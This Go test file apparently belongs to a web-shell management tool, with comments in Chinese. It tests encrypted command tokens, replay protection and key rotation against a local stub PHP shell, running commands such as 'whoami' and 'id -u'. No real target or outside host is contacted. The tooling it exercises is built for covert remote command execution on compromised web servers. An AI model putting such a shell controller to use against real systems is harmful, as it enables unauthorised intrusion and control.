package scanner

import (
	"context"
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

// TestOpenShellTokenWithKeys 验证 wire 层的双向兼容：新密钥的密文能被新密钥解，
// 旧密钥的在途密文在过渡期能被「新 + 旧」候选解开，但只用新密钥解不开旧密文。
// 时间戳/nonce 认证逐密钥执行，试第二把密钥不会绕过防重放。
func TestOpenShellTokenWithKeys(t *testing.T) {
	oldKey := testShellKey(t)
	newKey := testShellKey(t)
	mode := ShellCryptoGCM
	now := time.Now()

	oldToken, err := sealShellToken(oldKey, mode, []byte("from-old-key"), now)
	if err != nil {
		t.Fatalf("用旧密钥封 token: %v", err)
	}
	newToken, err := sealShellToken(newKey, mode, []byte("from-new-key"), now)
	if err != nil {
		t.Fatalf("用新密钥封 token: %v", err)
	}

	// 新密钥密文：新密钥优先解出。
	pt, idx, err := openShellTokenWithKeys([][]byte{newKey, oldKey}, mode, newToken, now)
	if err != nil || idx != 0 || string(pt) != "from-new-key" {
		t.Fatalf("新密钥密文应由候选 0 解开，pt=%q idx=%d err=%v", pt, idx, err)
	}
	// 旧密钥在途密文：新密钥解不开时回退到旧密钥（候选 1）。
	pt, idx, err = openShellTokenWithKeys([][]byte{newKey, oldKey}, mode, oldToken, now)
	if err != nil || idx != 1 || string(pt) != "from-old-key" {
		t.Fatalf("旧密钥密文应由候选 1 解开，pt=%q idx=%d err=%v", pt, idx, err)
	}
	// 过渡期结束后只剩新密钥：旧密文必须认证失败。
	if _, _, err := openShellTokenWithKeys([][]byte{newKey}, mode, oldToken, now); err == nil {
		t.Fatal("只用新密钥不该解开旧密钥密文")
	}
	// 防重放仍在：时间戳越界的密文即便密钥正确也拒绝。
	stale, err := sealShellToken(oldKey, mode, []byte("stale"), now.Add(-10*time.Minute))
	if err != nil {
		t.Fatalf("封过期 token: %v", err)
	}
	if _, _, err := openShellTokenWithKeys([][]byte{newKey, oldKey}, mode, stale, now); err == nil {
		t.Fatal("试新+旧密钥不得绕过时间戳窗口")
	}
}

// TestRotateShellKeyTransitionEndToEnd 在桩壳上跑真实轮换：轮换前后各执行一次
// 命令都成功（退出码 0 的类比），且轮换那一刻壳用旧密钥回执时也能被确认。
func TestRotateShellKeyTransitionEndToEnd(t *testing.T) {
	payload := buildTestV2Payload(t, "php")
	mode := ShellCryptoModeForType(payload.Type)

	oldKey := append([]byte{}, payload.Key...)
	newKey := testShellKey(t)
	// 壳在收到 R 后立刻切到新密钥，但本例让其回执仍用旧密钥封一次，模拟
	// 切换活动密钥与写回执之间的窗口。
	useOldForAck := true

	readToken := func(r *http.Request) string {
		if strings.HasPrefix(payload.Carrier, "X-") {
			return r.Header.Get(payload.Carrier)
		}
		_ = r.ParseForm()
		return r.PostFormValue(payload.Carrier)
	}
	writeToken := func(w http.ResponseWriter, k []byte, plain string) {
		token, err := sealShellToken(k, mode, []byte(plain), time.Now())
		if err != nil {
			w.WriteHeader(500)
			return
		}
		_, _ = w.Write([]byte(token))
	}

	activeKey := append([]byte{}, oldKey...)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := readToken(r)
		if token == "" {
			w.WriteHeader(404)
			return
		}
		// 桩壳在切换期同时认新+旧密钥。
		pt, _, err := openShellTokenWithKeys([][]byte{activeKey, oldKey, newKey}, mode, token, time.Now())
		if err != nil {
			w.WriteHeader(404)
			return
		}
		parts := strings.SplitN(string(pt), "|", 3)
		switch {
		case parts[0] == "E" && len(parts) >= 2:
			cmd, derr := base64.RawURLEncoding.DecodeString(parts[1])
			if derr != nil {
				w.WriteHeader(404)
				return
			}
			writeToken(w, activeKey, shellResponsePlain([]byte("out:"+string(cmd))))
		case parts[0] == "R" && len(parts) >= 2:
			nk, derr := base64.RawURLEncoding.DecodeString(parts[1])
			if derr != nil || len(nk) != 32 {
				w.WriteHeader(404)
				return
			}
			ackKey := activeKey
			if useOldForAck {
				ackKey = oldKey
			}
			activeKey = append([]byte{}, nk...)
			writeToken(w, ackKey, shellResponsePlain(nil))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	client := NewDeepClient(5 * time.Second)
	ctx := context.Background()

	// 轮换前执行命令，成功。
	out, err := RunShellCommand(ctx, client, srv.URL, payload, "whoami")
	if err != nil || out != "out:whoami" {
		t.Fatalf("轮换前命令应成功: out=%q err=%v", out, err)
	}

	// 轮换：壳用旧密钥回执，RotateShellKey 带 PrevKey 应能确认。
	if err := RotateShellKey(ctx, client, srv.URL, payload, newKey); err != nil {
		t.Fatalf("轮换（旧密钥回执）应成功: %v", err)
	}
	payload.Key = newKey

	// 轮换后执行命令，成功。
	out, err = RunShellCommand(ctx, client, srv.URL, payload, "id -u")
	if err != nil || out != "out:id -u" {
		t.Fatalf("轮换后命令应成功: out=%q err=%v", out, err)
	}
}
